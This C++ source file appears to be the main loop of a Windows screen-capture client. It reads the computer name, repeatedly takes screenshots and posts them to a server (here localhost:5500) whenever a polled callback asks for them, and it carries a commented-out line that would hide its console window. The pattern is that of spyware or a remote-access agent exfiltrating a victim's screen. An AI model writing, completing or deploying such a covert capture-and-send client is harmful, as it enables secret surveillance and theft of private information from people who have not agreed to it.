#include "sendcurl.h"
#include "getdata.h"

int main()
{
  /*  ShowWindow(GetConsoleWindow(), SW_HIDE);*/
    Beep(1000, 1000);
    std::string url = "http://localhost:5500/";
    std::string servercallback = "1";
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (!GetComputerName(computerName, &size)) {
        std::cerr << "Failed to get computer name. Error code: " << GetLastError() << std::endl;
    }

    //
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // получение размеров экрана для скриншотов с учетом масштаба 
    HDC hdcScreen = GetDC(NULL);
    HWND desktopWindow = GetDesktopWindow();
    
    float dpi = (float)GetDpiForWindow(desktopWindow) / 96; // масштаб(scale) в процентах 125% = 1.25f
    int screenWidth = GetSystemMetrics(SM_CXSCREEN) * dpi;
    int screenHeight = GetSystemMetrics(SM_CYSCREEN) * dpi;


    std::cout << "dpi: " << dpi;
   

   /* TCHAR tempDirectory[MAX_PATH];
    GetTempPath(MAX_PATH, tempDirectory);
    std::cout << tempDirectory;*/
 

    while (true) {
        sendCurl postReq;
        getData getUserData;

        if (servercallback == "1") {
            getUserData.takescreenshot(screenWidth, screenHeight);
            servercallback = postReq.curlSendData(url, computerName);
        }
        else {
            servercallback = postReq.curlEmptyCallBack(url, computerName);
        }
        Sleep(500);
        
    }
    Gdiplus::GdiplusShutdown(gdiplusToken);
	return 0;
}